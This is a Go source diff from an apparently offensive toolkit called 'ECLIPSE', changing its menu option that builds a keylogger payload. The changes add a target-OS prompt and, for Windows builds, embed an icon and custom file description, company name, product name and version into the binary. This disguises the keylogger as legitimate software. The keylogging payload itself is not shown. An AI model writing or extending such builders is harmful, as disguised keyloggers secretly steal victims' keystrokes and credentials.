@@ -6,7 +6,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strconv"
 	"strings"
 
@@ -45,13 +44,6 @@ func showKeyloggerMenu() {
 
 	fmt.Printf("%s  [1] Build Keylogger%s\n", utils.Red, utils.Reset)
 	utils.PrintReturnOption("2")
-}
-
-func targetBuildGOOS() string {
-	if v := strings.TrimSpace(os.Getenv("GOOS")); v != "" {
-		return v
-	}
-	return runtime.GOOS
 }
 
 func eclipseModuleRoot() string {
@@ -99,7 +91,7 @@ func buildKeylogger() {
 	fmt.Printf("\n%s═══ BUILD KEYLOGGER ═══%s\n\n", utils.Red, utils.Reset)
 
 	reader := bufio.NewReader(os.Stdin)
-	tGOOS := targetBuildGOOS()
+	tGOOS := utils.PromptBuildTarget(reader, utils.DefaultBuildTarget())
 	defaultFilename := suggestedKeyloggerFilename(tGOOS)
 
 	fmt.Printf("%sSuggested Windows name:%s eclipse_keylogger_windows.exe\n", utils.Blue, utils.Reset)
@@ -152,23 +144,22 @@ func buildKeylogger() {
 	sysoPath := filepath.Join(payloadDir, "rsrc.syso")
 	_ = os.Remove(sysoPath)
 
-	if icon != "" && tGOOS == "windows" {
-		fmt.Printf("%s[*] Preparing icon resource...%s\n", utils.Yellow, utils.Reset)
-		icoPath, cleanupIco, err := utils.MaterializeICO(icon)
+	if tGOOS == "windows" {
+		cleanupResource, err := utils.PrepareWindowsResource(utils.WindowsResourceConfig{
+			Dir:             payloadDir,
+			SysoName:        "rsrc.syso",
+			IconPath:        icon,
+			FileDescription: fileDescription,
+			CompanyName:     companyName,
+			ProductName:     defaultString(fileDescription, "ECLIPSE Keylogger"),
+			ProductVersion:  productVersion,
+		})
 		if err != nil {
-			fmt.Printf("%s[!] Icon: %v%s\n", utils.Red, err, utils.Reset)
+			fmt.Printf("%s[!] Windows resource: %v%s\n", utils.Red, err, utils.Reset)
 			utils.PauseForInput()
 			return
 		}
-		defer cleanupIco()
-		cmd := exec.Command("rsrc", "-ico", icoPath, "-o", sysoPath)
-		cmd.Dir = payloadDir
-		if err := cmd.Run(); err != nil {
-			fmt.Printf("%s[!] rsrc failed (go install github.com/akavel/rsrc@latest): %v%s\n", utils.Red, err, utils.Reset)
-			utils.PauseForInput()
-			return
-		}
-		defer os.Remove(sysoPath)
+		defer cleanupResource()
 	}
 
 	fmt.Printf("\n%s[*] Building keylogger...%s\n", utils.Yellow, utils.Reset)
@@ -199,7 +190,7 @@ func buildKeylogger() {
 	args = append(args, "./scripts/keylogger/payload")
 
 	cmd := exec.Command("go", args...)
-	cmd.Env = os.Environ()
+	cmd.Env = utils.GoBuildEnv(tGOOS)
 	output, err := cmd.CombinedOutput()
 
 	if err != nil {
@@ -218,4 +209,12 @@ func selectIconForKeylogger(reader *bufio.Reader) string {
 	root := eclipseModuleRoot()
 	imgPath := filepath.Join(root, "img")
 	return utils.SelectIconImage(reader, imgPath)
+}
+
+func defaultString(value, fallback string) string {
+	value = strings.TrimSpace(value)
+	if value == "" {
+		return fallback
+	}
+	return value
 }
